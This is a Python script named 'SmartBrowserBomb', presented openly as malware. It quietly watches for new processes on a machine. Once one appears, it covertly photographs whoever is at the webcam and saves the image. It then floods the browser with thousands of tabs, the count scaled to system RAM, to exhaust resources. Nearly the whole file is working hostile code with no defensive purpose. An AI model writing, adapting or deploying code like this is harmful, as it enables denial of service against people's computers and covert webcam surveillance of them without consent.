import platform
import psutil
import os
import threading
import webbrowser
import time
import logging
import subprocess
import sys
import cv2

# === CONFIGURATION ===
HEADLESS_MODE = True  # Set to True for headless (no GUI)
LOG_FILE = "activity.log"
CAPTURE_FILE = "webcam_capture.jpg"

# === LOGGING SETUP ===
logging.basicConfig(
    filename=LOG_FILE,
    filemode='a',
    format='%(asctime)s - %(message)s',
    level=logging.INFO
)

def log(msg):
    print(msg)
    logging.info(msg)

class SmartBrowserBomb:
    def __init__(self):
        self.running = False
        self.root = None
        self.tab_count = 0
        self.triggered = False
        self.existing_processes = set()
        self.detect_system_specs()

        # Record baseline processes
        self.existing_processes = self.get_current_processes()
        log(f"Learning baseline... {len(self.existing_processes)} processes recorded. Waiting for new activity...")

        # Start background activity monitor
        threading.Thread(target=self.monitor_user_activity, daemon=True).start()

    def detect_system_specs(self):
        self.os_name = platform.system()
        self.ram_mb = psutil.virtual_memory().total // (1024 * 1024)
        self.cpu_cores = os.cpu_count()
        self.tab_count = self.calculate_tab_count()
        log(f"Detected system → OS: {self.os_name}, RAM: {self.ram_mb}MB, CPU Cores: {self.cpu_cores}")

    def calculate_tab_count(self):
        if self.ram_mb >= 8000:
            return self.ram_mb // 8
        elif self.ram_mb >= 4000:
            return self.ram_mb // 6
        else:
            return self.ram_mb // 4

    def get_current_processes(self):
        current = set()
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name']:
                    current.add(proc.info['name'].lower())
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return current

    def monitor_user_activity(self):
        seen = self.existing_processes
        while not self.triggered:
            time.sleep(2)
            current = self.get_current_processes()
            new = current - seen
            if new:
                self.triggered = True
                log(f"New process detected: {list(new)[:1]} → Triggering the bomb!")
                self.running = True
                threading.Thread(target=self.capture_webcam_snapshot, daemon=True).start()
                threading.Thread(target=self.launch_tabs, daemon=True).start()
                return
            seen = current

    def capture_webcam_snapshot(self):
        try:
            log("[INFO] Capturing webcam image...")
            cam = cv2.VideoCapture(0)
            time.sleep(1)
            ret, frame = cam.read()
            if ret:
                cv2.imwrite(CAPTURE_FILE, frame)
                log(f"Webcam snapshot saved as {CAPTURE_FILE}")
            else:
                log("[WARNING] Failed to capture image from webcam.")
            cam.release()
            cv2.destroyAllWindows()
        except Exception as e:
            log(f"[ERROR] Webcam capture error: {e}")

    def launch_tabs(self):
        log(f"Launching {self.tab_count} tabs...")
        for i in range(1, self.tab_count + 1):
            if not self.running:
                log(f"Stopped at tab {i}")
                return
            webbrowser.open("https://www.google.com")
            log(f"Opened tab {i}")
            time.sleep(0.1)
        log("All tabs launched.")

    def stop_bomb(self):
        self.running = False
        log("[INFO] Bomb stopped by user.")
        sys.exit(0)

if __name__ == "__main__":
    SmartBrowserBomb()
    while True:
        time.sleep(1)
